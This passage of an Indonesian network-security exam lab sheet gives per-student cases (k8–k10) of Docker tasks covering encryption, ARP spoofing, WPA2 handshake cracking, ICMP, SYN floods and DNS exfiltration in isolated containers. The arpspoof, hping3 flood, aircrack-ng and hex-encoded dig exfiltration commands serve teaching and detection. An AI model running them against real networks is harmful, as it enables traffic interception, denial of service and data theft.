Bukti: MAC gateway di tabel ARP korban berubah setelah spoofing, lalu kembali normal setelah mitigasi static ARP.

### Tugas 4 (Pertemuan 4): Analisis handshake WPA2

```bash
docker run --rm -v "$PWD":/work uts-kali-tools aircrack-ng -w wordlist-k7.txt handshake-k7.cap
```

File `handshake-k7.cap` dan `wordlist-k7.txt` disediakan penguji. Bukti: kata sandi yang ditemukan atau pesan KEY NOT FOUND, beserta penjelasan empat langkah handshake.

### Tugas 5 (Pertemuan 5): ICMP dengan Scapy

```bash
docker run --rm --network lab-arp-k7 -v "$PWD/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py <ip-korban>
```

Bukti: TTL dan tipe ICMP balasan, lalu penjelasan smurf attack.

### Tugas 6 (Pertemuan 6): SYN flood dan three-way handshake

```bash
docker compose -p k7 -f b/b3-syn-flood/docker-compose.yml up -d
docker compose -p k7 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
docker compose -p k7 -f b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target
docker compose -p k7 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
docker compose -p k7 -f b/b3-syn-flood/docker-compose.yml exec attacker sh -c 'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 10'
docker compose -p k7 -f b/b3-syn-flood/docker-compose.yml down -v
```

Bukti: jumlah SYN_RECV sebelum dan saat serangan, serta paket SYN, SYN-ACK, dan ACK dari tcpdump.

### Tugas 7 (Pertemuan 7): DNS exfiltration

```bash
docker compose -p k7 -f b/b4-dns-exfil/docker-compose.yml up -d
echo -n NIM-ANDA | xxd -p
docker compose -p k7 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig +short <hex>.k7.exfil.lab @dns
docker compose -p k7 -f b/b4-dns-exfil/docker-compose.yml logs dns > dns-k7.log
python3 kasus/k9-dns-detect/analisis_dns.py dns-k7.log
echo <hex> | xxd -r -p
docker compose -p k7 -f b/b4-dns-exfil/docker-compose.yml down -v
```

Bukti: label hex terdeteksi di log, lalu pesan NIM Anda hasil decode.


---

## Kasus 8 (k8)

Parameter: container target-k8, volume vol-k8, file laporan-k8.txt, kata sandi kunci-k8-2026, domain k8.exfil.lab. Ganti NIM-ANDA dengan NIM Anda. Ganti placeholder <...> dengan hasil perintah sebelumnya.

### Tugas 1 (Pertemuan 1): Docker dan volume

```bash
docker volume create vol-k8
docker run --name w-k8 -v vol-k8:/data alpine sh -c 'echo NIM-ANDA > /data/laporan-k8.txt'
docker rm w-k8
docker run --rm -v vol-k8:/data alpine cat /data/laporan-k8.txt
docker compose -p k8 -f b/b1-compose/docker-compose.yml up -d
docker compose -p k8 -f b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
docker compose -p k8 -f b/b1-compose/docker-compose.yml down -v
```

Bukti: isi file dari container baru dan halaman nginx dari attacker.

### Tugas 2 (Pertemuan 2): Kriptografi

```bash
docker run --rm -v "$PWD":/work uts-openssl sh -c 'echo isi laporan k8 > laporan-k8.txt && openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k8.txt -out laporan-k8.enc -pass pass:kunci-k8-2026 && sha256sum laporan-k8.txt && openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k8.enc -out hasil-k8.txt -pass pass:kunci-k8-2026 && sha256sum hasil-k8.txt'
docker run --rm -v "$PWD":/work uts-openssl sh -c 'openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k8.pem -out cert-k8.pem -days 30 -subj /CN=k8.uts.local && openssl x509 -in cert-k8.pem -noout -subject -issuer -dates'
```

Bukti: dua hash SHA-256 harus sama, lalu Subject dan Issuer sertifikat.

### Tugas 3 (Pertemuan 3): ARP spoofing

```bash
docker network create lab-arp-k8
docker run -d --name korban-k8 --network lab-arp-k8 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name gateway-k8 --network lab-arp-k8 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name penyerang-k8 --network lab-arp-k8 --cap-add NET_ADMIN uts-kali-tools
docker inspect -f '{{.NetworkSettings.Networks.lab-arp-k8.IPAddress}}' korban-k8 gateway-k8
docker exec korban-k8 arp -a
docker exec -d penyerang-k8 timeout 20 arpspoof -i eth0 -t <ip-korban> <ip-gateway>
docker exec korban-k8 arp -a
docker exec korban-k8 arp -s <ip-gateway> $(docker exec gateway-k8 cat /sys/class/net/eth0/address)
docker exec korban-k8 arp -a
```

Bukti: MAC gateway di tabel ARP korban berubah setelah spoofing, lalu kembali normal setelah mitigasi static ARP.

### Tugas 4 (Pertemuan 4): Analisis handshake WPA2

```bash
docker run --rm -v "$PWD":/work uts-kali-tools aircrack-ng -w wordlist-k8.txt handshake-k8.cap
```

File `handshake-k8.cap` dan `wordlist-k8.txt` disediakan penguji. Bukti: kata sandi yang ditemukan atau pesan KEY NOT FOUND, beserta penjelasan empat langkah handshake.

### Tugas 5 (Pertemuan 5): ICMP dengan Scapy

```bash
docker run --rm --network lab-arp-k8 -v "$PWD/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py <ip-korban>
```

Bukti: TTL dan tipe ICMP balasan, lalu penjelasan smurf attack.

### Tugas 6 (Pertemuan 6): SYN flood dan three-way handshake

```bash
docker compose -p k8 -f b/b3-syn-flood/docker-compose.yml up -d
docker compose -p k8 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
docker compose -p k8 -f b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target
docker compose -p k8 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
docker compose -p k8 -f b/b3-syn-flood/docker-compose.yml exec attacker sh -c 'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 10'
docker compose -p k8 -f b/b3-syn-flood/docker-compose.yml down -v
```

Bukti: jumlah SYN_RECV sebelum dan saat serangan, serta paket SYN, SYN-ACK, dan ACK dari tcpdump.

### Tugas 7 (Pertemuan 7): DNS exfiltration

```bash
docker compose -p k8 -f b/b4-dns-exfil/docker-compose.yml up -d
echo -n NIM-ANDA | xxd -p
docker compose -p k8 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig +short <hex>.k8.exfil.lab @dns
docker compose -p k8 -f b/b4-dns-exfil/docker-compose.yml logs dns > dns-k8.log
python3 kasus/k9-dns-detect/analisis_dns.py dns-k8.log
echo <hex> | xxd -r -p
docker compose -p k8 -f b/b4-dns-exfil/docker-compose.yml down -v
```

Bukti: label hex terdeteksi di log, lalu pesan NIM Anda hasil decode.


---

## Kasus 9 (k9)

Parameter: container target-k9, volume vol-k9, file laporan-k9.txt, kata sandi kunci-k9-2026, domain k9.exfil.lab. Ganti NIM-ANDA dengan NIM Anda. Ganti placeholder <...> dengan hasil perintah sebelumnya.

### Tugas 1 (Pertemuan 1): Docker dan volume

```bash
docker volume create vol-k9
docker run --name w-k9 -v vol-k9:/data alpine sh -c 'echo NIM-ANDA > /data/laporan-k9.txt'
docker rm w-k9
docker run --rm -v vol-k9:/data alpine cat /data/laporan-k9.txt
docker compose -p k9 -f b/b1-compose/docker-compose.yml up -d
docker compose -p k9 -f b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
docker compose -p k9 -f b/b1-compose/docker-compose.yml down -v
```

Bukti: isi file dari container baru dan halaman nginx dari attacker.

### Tugas 2 (Pertemuan 2): Kriptografi

```bash
docker run --rm -v "$PWD":/work uts-openssl sh -c 'echo isi laporan k9 > laporan-k9.txt && openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k9.txt -out laporan-k9.enc -pass pass:kunci-k9-2026 && sha256sum laporan-k9.txt && openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k9.enc -out hasil-k9.txt -pass pass:kunci-k9-2026 && sha256sum hasil-k9.txt'
docker run --rm -v "$PWD":/work uts-openssl sh -c 'openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k9.pem -out cert-k9.pem -days 30 -subj /CN=k9.uts.local && openssl x509 -in cert-k9.pem -noout -subject -issuer -dates'
```

Bukti: dua hash SHA-256 harus sama, lalu Subject dan Issuer sertifikat.

### Tugas 3 (Pertemuan 3): ARP spoofing

```bash
docker network create lab-arp-k9
docker run -d --name korban-k9 --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name gateway-k9 --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name penyerang-k9 --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools
docker inspect -f '{{.NetworkSettings.Networks.lab-arp-k9.IPAddress}}' korban-k9 gateway-k9
docker exec korban-k9 arp -a
docker exec -d penyerang-k9 timeout 20 arpspoof -i eth0 -t <ip-korban> <ip-gateway>
docker exec korban-k9 arp -a
docker exec korban-k9 arp -s <ip-gateway> $(docker exec gateway-k9 cat /sys/class/net/eth0/address)
docker exec korban-k9 arp -a
```

Bukti: MAC gateway di tabel ARP korban berubah setelah spoofing, lalu kembali normal setelah mitigasi static ARP.

### Tugas 4 (Pertemuan 4): Analisis handshake WPA2

```bash
docker run --rm -v "$PWD":/work uts-kali-tools aircrack-ng -w wordlist-k9.txt handshake-k9.cap
```

File `handshake-k9.cap` dan `wordlist-k9.txt` disediakan penguji. Bukti: kata sandi yang ditemukan atau pesan KEY NOT FOUND, beserta penjelasan empat langkah handshake.

### Tugas 5 (Pertemuan 5): ICMP dengan Scapy

```bash
docker run --rm --network lab-arp-k9 -v "$PWD/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py <ip-korban>
```

Bukti: TTL dan tipe ICMP balasan, lalu penjelasan smurf attack.

### Tugas 6 (Pertemuan 6): SYN flood dan three-way handshake

```bash
docker compose -p k9 -f b/b3-syn-flood/docker-compose.yml up -d
docker compose -p k9 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
docker compose -p k9 -f b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target
docker compose -p k9 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
docker compose -p k9 -f b/b3-syn-flood/docker-compose.yml exec attacker sh -c 'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 10'
docker compose -p k9 -f b/b3-syn-flood/docker-compose.yml down -v
```

Bukti: jumlah SYN_RECV sebelum dan saat serangan, serta paket SYN, SYN-ACK, dan ACK dari tcpdump.

### Tugas 7 (Pertemuan 7): DNS exfiltration

```bash
docker compose -p k9 -f b/b4-dns-exfil/docker-compose.yml up -d
echo -n NIM-ANDA | xxd -p
docker compose -p k9 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig +short <hex>.k9.exfil.lab @dns
docker compose -p k9 -f b/b4-dns-exfil/docker-compose.yml logs dns > dns-k9.log
python3 kasus/k9-dns-detect/analisis_dns.py dns-k9.log
echo <hex> | xxd -r -p
docker compose -p k9 -f b/b4-dns-exfil/docker-compose.yml down -v
```

Bukti: label hex terdeteksi di log, lalu pesan NIM Anda hasil decode.


---

## Kasus 10 (k10)

Parameter: container target-k10, volume vol-k10, file laporan-k10.txt, kata sandi kunci-k10-2026, domain k10.exfil.lab. Ganti NIM-ANDA dengan NIM Anda. Ganti placeholder <...> dengan hasil perintah sebelumnya.

### Tugas 1 (Pertemuan 1): Docker dan volume

```bash
docker volume create vol-k10
docker run --name w-k10 -v vol-k10:/data alpine sh -c 'echo NIM-ANDA > /data/laporan-k10.txt'
docker rm w-k10
docker run --rm -v vol-k10:/data alpine cat /data/laporan-k10.txt
docker compose -p k10 -f b/b1-compose/docker-compose.yml up -d
docker compose -p k10 -f b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
docker compose -p k10 -f b/b1-compose/docker-compose.yml down -v
```

Bukti: isi file dari container baru dan halaman nginx dari attacker.

### Tugas 2 (Pertemuan 2): Kriptografi

```bash
docker run --rm -v "$PWD":/work uts-openssl sh -c 'echo isi laporan k10 > laporan-k10.txt && openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k10.txt -out laporan-k10.enc -pass pass:kunci-k10-2026 && sha256sum laporan-k10.txt && openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k10.enc -out hasil-k10.txt -pass pass:kunci-k10-2026 && sha256sum hasil-k10.txt'
docker run --rm -v "$PWD":/work uts-openssl sh -c 'openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k10.pem -out cert-k10.pem -days 30 -subj /CN=k10.uts.local && openssl x509 -in cert-k10.pem -noout -subject -issuer -dates'
```

Bukti: dua hash SHA-256 harus sama, lalu Subject dan Issuer sertifikat.

### Tugas 3 (Pertemuan 3): ARP spoofing

```bash
docker network create lab-arp-k10
docker run -d --name korban-k10 --network lab-arp-k10 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name gateway-k10 --network lab-arp-k10 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name penyerang-k10 --network lab-arp-k10 --cap-add NET_ADMIN uts-kali-tools
docker inspect -f '{{.NetworkSettings.Networks.lab-arp-k10.IPAddress}}' korban-k10 gateway-k10
docker exec korban-k10 arp -a
docker exec -d penyerang-k10 timeout 20 arpspoof -i eth0 -t <ip-korban> <ip-gateway>
docker exec korban-k10 arp -a
docker exec korban-k10 arp -s <ip-gateway> $(docker exec gateway-k10 cat /sys/class/net/eth0/address)
docker exec korban-k10 arp -a
```

Bukti: MAC gateway di tabel ARP korban berubah setelah spoofing, lalu kembali normal setelah mitigasi static ARP.

### Tugas 4 (Pertemuan 4): Analisis handshake WPA2

```bash
docker run --rm -v "$PWD":/work uts-kali-tools aircrack-ng -w wordlist-k10.txt handshake-k10.cap
```

File `handshake-k10.cap` dan `wordlist-k10.txt` disediakan penguji. Bukti: kata sandi yang ditemukan atau pesan KEY NOT FOUND, beserta penjelasan empat langkah handshake.

### Tugas 5 (Pertemuan 5): ICMP dengan Scapy

```bash
docker run --rm --network lab-arp-k10 -v "$PWD/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py <ip-korban>
```

Bukti: TTL dan tipe ICMP balasan, lalu penjelasan smurf attack.

### Tugas 6 (Pertemuan 6): SYN flood dan three-way handshake

```bash
docker compose -p k10 -f b/b3-syn-flood/docker-compose.yml up -d
docker compose -p k10 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
docker compose -p k10 -f b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target
docker compose -p k10 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
docker compose -p k10 -f b/b3-syn-flood/docker-compose.yml exec attacker sh -c 'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 10'
docker compose -p k10 -f b/b3-syn-flood/docker-compose.yml down -v
```

Bukti: jumlah SYN_RECV sebelum dan saat serangan, serta paket SYN, SYN-ACK, dan ACK dari tcpdump.

### Tugas 7 (Pertemuan 7): DNS exfiltration

```bash
docker compose -p k10 -f b/b4-dns-exfil/docker-compose.yml up -d
echo -n NIM-ANDA | xxd -p
docker compose -p k10 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig +short <hex>.k10.exfil.lab @dns
docker compose -p k10 -f b/b4-dns-exfil/docker-compose.yml logs dns > dns-k10.log
python3 kasus/k9-dns-detect/analisis_dns.py dns-k10.log
echo <hex> | xxd -r -p
docker compose -p k10 -f b/b4-dns-exfil/docker-compose.yml down -v
```

Bukti: label hex terdeteksi di log, lalu pesan NIM Anda hasil decode.


---

